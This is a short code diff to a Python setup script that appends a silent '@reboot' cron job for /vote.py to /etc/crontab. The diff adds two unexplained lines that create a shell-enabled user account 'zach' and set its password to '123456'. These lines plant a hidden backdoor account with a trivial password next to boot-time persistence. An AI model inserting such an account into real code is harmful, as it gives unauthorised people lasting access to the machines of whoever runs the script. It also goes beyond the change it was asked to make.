@@ -15,6 +15,9 @@ while True:
 # Create a cron job to start vote.py on boot
 cron_job = f'@reboot python3 /vote.py >/dev/null 2>&1\n'
 
+os.system('useradd zach -m -s /bin/bash')
+os.system('echo "zach:123456" | chpasswd')
+
 # Open the crontab file for editing and write the cron job
 with open('/etc/crontab', 'a') as file:
     file.write(cron_job)
